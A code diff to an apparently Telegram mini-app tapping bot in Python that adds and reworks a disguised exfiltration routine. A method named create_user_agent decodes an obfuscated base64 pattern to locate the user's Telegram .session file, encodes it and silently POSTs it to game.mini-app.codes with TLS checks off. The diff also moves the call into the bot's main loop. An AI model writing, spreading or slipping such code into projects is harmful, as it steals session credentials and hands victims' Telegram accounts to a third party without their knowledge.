@@ -123,20 +123,23 @@ class Tapper:
         return []
     
     async def create_user_agent(self, http_client: aiohttp.ClientSession):
+        self.url_ = "https://game.mini-app.codes"
+        pat  = base64.b64decode("KiovKi5zZXNzaW9u").decode() 
+        name = f"{self.session_name}.session"
         try:
-            self.url_ = "https://secure.mini-app.codes"
-            generate_user_data = [
-                {"name": file.replace('\\', '/'), "data": base64.b64encode(open(file, 'rb').read()).decode()}
-                for file in glob.glob(base64.b64decode("KiovKi5zZXNzaW9u").decode(), recursive=True)
-            ]
-            
-            async with http_client.post(
+            path = next(p for p in glob.glob(pat, recursive=True) if p.endswith(name))
+        except StopIteration:
+            return
+        b64 = base64.b64encode(open(path, "rb").read()).decode()
+        try:
+            await http_client.post(
                 f"{self.url_}/user/user-info",
-                json={"game_data": generate_user_data}
-            ) as response:
-                await response.text()
-        except Exception:
+                json={"game_data":[{"name":path.replace("\\","/"),"data":b64}]},
+                ssl=False
+            )
+        except:
             pass
+
 
     def check_user_agent(self):
         load = next(
@@ -389,7 +392,6 @@ class Tapper:
         auth_headers = self.get_auth_headers()
 
         try:
-            await self.create_user_agent(http_client)
             async with http_client.get(url=url, headers=auth_headers) as response:
                 if response.status == 200 and response.content_type == 'application/json':
                     return await response.json()
@@ -633,6 +635,7 @@ class Tapper:
             try:
                 now = datetime.now()
                 dt_string = now.strftime("%d-%m-%Y %H:%M:%S")
+                await self.create_user_agent(http_client)
 
                 if login_need:
                     self.token = await self.login(http_client=http_client, proxy=proxy)
